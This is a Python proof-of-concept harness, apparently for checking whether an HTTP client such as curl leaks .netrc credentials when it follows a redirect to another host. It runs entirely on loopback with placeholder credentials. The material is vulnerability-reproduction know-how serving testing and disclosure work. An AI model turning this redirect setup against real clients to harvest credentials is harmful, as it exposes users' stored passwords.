#!/usr/bin/env python3
"""Drive an HTTP client binary against a local loopback server and report a
normalized transcript of the traffic the server received.

The run is fully self-contained, offline and replayable:

  * an HTTP server is bound to 127.0.0.1 on an ephemeral port;
  * a temporary .netrc credential file is created in a directory this run
    owns and removed afterwards;
  * the client is launched with redirect-following and --resolve entries so
    every connection stays on loopback;
  * GET / is answered with a 301 to http://b.localhost:<port>/followed, any
    other path with 200 and the body "OK";
  * every request the server receives is recorded and normalized into one
    transcript line:
    ``REQ <index> host=<Host header> auth=<Authorization header or "none">``.

Exactly one JSON object describing the run is written to stdout (and to the
--json-out file when given). Nothing else is printed to stdout.

Usage:
    python3 poc.py --binary <path-to-http-client-binary> \
        [--json-out <path>] [--timeout <seconds>]
"""

import argparse
import json
import os
import shutil
import signal
import subprocess
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

NETRC_CONTENT = (
    "machine a.localhost\n"
    "login alice\n"
    "password secretpw\n"
    "default\n"
)

KILL_GRACE_SECONDS = 5.0
# Grace period after the client exits, so an in-flight handler thread can
# finish recording before the transcript snapshot is taken.
SHUTDOWN_GRACE_SECONDS = 0.1


class TranscriptHTTPServer(ThreadingHTTPServer):
    """Loopback HTTP server that records the Host and Authorization headers
    of every request it receives."""

    daemon_threads = True
    redirect_path = "/followed"

    def __init__(self, address, handler):
        self._lock = threading.Lock()
        self._requests = []
        super().__init__(address, handler)

    @property
    def redirect_target(self):
        return "http://b.localhost:%d%s" % (self.server_address[1], self.redirect_path)

    def record(self, host, auth):
        with self._lock:
            self._requests.append((host, auth))

    def transcript(self):
        with self._lock:
            snapshot = list(self._requests)
        lines = [
            "REQ %d host=%s auth=%s" % (index, host, auth if auth is not None else "none")
            for index, (host, auth) in enumerate(snapshot, 1)
        ]
        return "".join(line + "\n" for line in lines)


class RecordingHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "poc-loopback/1.0"

    def _serve(self, include_body=True):
        host = self.headers.get("Host")
        auth = self.headers.get("Authorization")
        self.server.record(host if host is not None else "", auth)
        if self.path == "/":
            self.send_response(301)
            self.send_header("Location", self.server.redirect_target)
            self.send_header("Content-Length", "0")
            self.end_headers()
        else:
            body = b"OK"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            if include_body:
                self.wfile.write(body)

    def do_GET(self):
        self._serve()

    def do_HEAD(self):
        self._serve(include_body=False)

    do_POST = do_GET
    do_PUT = do_GET
    do_DELETE = do_GET
    do_PATCH = do_GET
    do_OPTIONS = do_GET

    def log_message(self, fmt, *args):
        """Keep stdout/stderr of the driver free of per-request log lines."""


def _decode(data):
    return (data or b"").decode("utf-8", errors="replace")


def _signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return "SIG%d" % -returncode


def run_client(command, timeout, env):
    """Run the client once.

    Returns (returncode, timed_out, runtime_ms, stdout, stderr).
    """
    start = time.monotonic()
    proc = subprocess.Popen(
        command,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env,
    )
    timed_out = False
    try:
        stdout, stderr = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()
        try:
            stdout, stderr = proc.communicate(timeout=KILL_GRACE_SECONDS)
        except subprocess.TimeoutExpired:
            stdout, stderr = b"", b""
    runtime_ms = int(round((time.monotonic() - start) * 1000))
    return proc.returncode, timed_out, runtime_ms, _decode(stdout), _decode(stderr)


def run_poc(binary, timeout):
    """Execute the full scenario and return the result dictionary."""
    result = {
        "binary": binary,
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "protocol_transcript", "value": "", "path": None},
        "error": None,
    }

    tmpdir = None
    server = None
    try:
        server = TranscriptHTTPServer(("127.0.0.1", 0), RecordingHandler)
        port = server.server_address[1]

        # Trigger input is constructed at run time: a private directory
        # holding the .netrc the client is pointed at via --netrc-file.
        tmpdir = tempfile.mkdtemp(prefix="poc-netrc-")
        netrc_path = os.path.join(tmpdir, ".netrc")
        with open(netrc_path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(NETRC_CONTENT)
        os.chmod(netrc_path, 0o600)

        command = [
            binary,
            "-L",
            "--max-redirs", "3",
            "--resolve", "a.localhost:%d:127.0.0.1" % port,
            "--resolve", "b.localhost:%d:127.0.0.1" % port,
            "--netrc-file", netrc_path,
            "http://a.localhost:%d/" % port,
        ]
        result["command"] = list(command)

        # Keep the client away from user-level configuration such as
        # ~/.curlrc: HOME points at the directory this run owns.
        env = dict(os.environ)
        env["HOME"] = tmpdir
        env["CURL_HOME"] = tmpdir

        serve_thread = threading.Thread(
            target=server.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True
        )
        serve_thread.start()
        try:
            (
                result["returncode"],
                result["timed_out"],
                result["runtime_ms"],
                result["stdout"],
                result["stderr"],
            ) = run_client(command, timeout, env)
        finally:
            # The client is done: stop accepting connections and snapshot
            # what the server saw.
            time.sleep(SHUTDOWN_GRACE_SECONDS)
            server.shutdown()
            server.server_close()
        result["observable"]["value"] = server.transcript()
        result["signal"] = _signal_name(result["returncode"])
    except Exception as exc:  # any failure is reported in-band, as JSON
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        if tmpdir is not None:
            shutil.rmtree(tmpdir, ignore_errors=True)
    return result


def emit(result, json_out):
    payload = json.dumps(result, indent=2)
    if json_out:
        parent = os.path.dirname(os.path.abspath(json_out))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(json_out, "w", encoding="utf-8") as fh:
            fh.write(payload + "\n")
    sys.stdout.write(payload + "\n")
    sys.stdout.flush()


def parse_args(argv):
    parser = argparse.ArgumentParser(
        description="Run an HTTP client binary against a local loopback "
        "server and report a normalized protocol transcript."
    )
    parser.add_argument(
        "--binary", required=True, help="path to the HTTP client binary to test"
    )
    parser.add_argument(
        "--json-out", default=None, help="also write the JSON result to this file"
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=30.0,
        help="per-run timeout in seconds (default: 30)",
    )
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    result = run_poc(args.binary, args.timeout)
    try:
        emit(result, args.json_out)
    except OSError as exc:
        result["error"] = result["error"] or "failed to write output: %s" % exc
        sys.stdout.write(json.dumps(result, indent=2) + "\n")
        return 1
    return 0 if result["error"] is None else 1


if __name__ == "__main__":
    sys.exit(main())
